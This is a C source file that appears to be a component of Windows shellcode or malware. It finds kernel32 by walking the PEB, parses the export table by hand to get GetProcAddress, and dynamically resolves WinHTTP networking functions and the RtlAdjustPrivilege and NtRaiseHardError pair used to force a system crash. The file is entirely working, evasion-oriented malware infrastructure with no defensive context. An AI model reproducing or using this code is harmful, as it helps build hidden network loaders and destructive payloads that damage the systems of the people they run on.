#include <stdint.h>
#include "API.h"

#define KERNEL32 Win32.MODULE.Kernel32
#define WINHTTP  Win32.MODULE.Winhttp
#define NTDLL    Win32.MODULE.Ntdll
#define GETPROCADDRESS(x, y) Win32.API.rGetProcAddress(x, y)

PVOID GetKernel32(void) {
    PEB*                  peb            = (PEB*)__readgsqword(0x60);
    LDR_DATA_TABLE_ENTRY* pKernel32Entry = CONTAINING_RECORD(peb->Ldr->InMemoryOrderModuleList.Flink->Flink->Flink, LDR_DATA_TABLE_ENTRY, InMemoryOrderLinks);
    return pKernel32Entry->DllBase;
}

_GetProcAddress GetGetProcAddress(void) {
    IMAGE_DOS_HEADER*       pDosHeader            = (IMAGE_DOS_HEADER*)GetKernel32();
    IMAGE_NT_HEADERS*       pNtHeaders            = (IMAGE_NT_HEADERS *)(pDosHeader->e_lfanew + (size_t)pDosHeader);
    IMAGE_EXPORT_DIRECTORY* pExportTable          = (IMAGE_EXPORT_DIRECTORY *)((size_t)pDosHeader + pNtHeaders->OptionalHeader.DataDirectory[0].VirtualAddress);
    const int32_t*          pNameTablesOffset     = (const int32_t *)((size_t)pDosHeader + pExportTable->AddressOfNames);
    const int16_t*          pOrdinalTablesOffset  = (const int16_t *)((size_t)pDosHeader + pExportTable->AddressOfNameOrdinals);
    const int32_t*          pAddressTablesOffset  = (const int32_t *)((size_t)pDosHeader + pExportTable->AddressOfFunctions);
    
    int i = 0;
    while(strcmp((char*)pDosHeader + pNameTablesOffset[i], STR_GETPROCADDRESS) != 0) {++i;}
    return (_GetProcAddress)((size_t)pDosHeader + pAddressTablesOffset[pOrdinalTablesOffset[i]]);
}

void BindAPI(void) {
    Win32.MODULE.Kernel32     = (HMODULE)GetKernel32();
    Win32.API.rGetProcAddress = GetGetProcAddress();
    Win32.API.rLoadLibraryA   = (_LoadLibraryA)Win32.API.rGetProcAddress(Win32.MODULE.Kernel32, STR_LOADLIBRARYA);
    Win32.MODULE.Ntdll        = Win32.API.rLoadLibraryA(STR_NTDLL);
    Win32.MODULE.Winhttp      = Win32.API.rLoadLibraryA(STR_WINHTTP);

    Win32.API.rWinHttpOpen               = (_WinHttpOpen)GETPROCADDRESS(WINHTTP, STR_WINHTTPOPEN);
    Win32.API.rWinHttpConnect            = (_WinHttpConnect)GETPROCADDRESS(WINHTTP, STR_WINHTTPCONNECT);
    Win32.API.rWinHttpOpenRequest        = (_WinHttpOpenRequest)GETPROCADDRESS(WINHTTP, STR_WINHTTPOPENREQUEST);
    Win32.API.rWinHttpSendRequest        = (_WinHttpSendRequest)GETPROCADDRESS(WINHTTP, STR_WINHTTPSENDREQUEST);
    Win32.API.rWinHttpReceiveResponse    = (_WinHttpReceiveResponse)GETPROCADDRESS(WINHTTP, STR_WINHTTPRECEIVERESPONSE);
    Win32.API.rWinHttpQueryHeaders       = (_WinHttpQueryHeaders)GETPROCADDRESS(WINHTTP, STR_WINHTTPQUERYHEADERS);
    Win32.API.rWinHttpQueryDataAvailable = (_WinHttpQueryDataAvailable)GETPROCADDRESS(WINHTTP, STR_WINHTTPQUERYDATAAVAILABLE);
    Win32.API.rWinHttpReadData           = (_WinHttpReadData)GETPROCADDRESS(WINHTTP, STR_WINHTTPREADDATA);
    Win32.API.rWinHttpCloseHandle        = (_WinHttpCloseHandle)GETPROCADDRESS(WINHTTP, STR_WINHTTPCLOSEHANDLE);
    Win32.API.rWinHttpSetOption          = (_WinHttpSetOption)GETPROCADDRESS(WINHTTP, STR_WINHTTPSETOPTION);

    Win32.API.rRtlAdjustPrivilege = (_RtlAdjustPrivilege)GETPROCADDRESS(NTDLL, STR_RTLADJUSTPRIVILEGE);
    Win32.API.rNtRaiseHardError   = (_NtRaiseHardError)GETPROCADDRESS(NTDLL, STR_NTRAISEHARDERROR);
}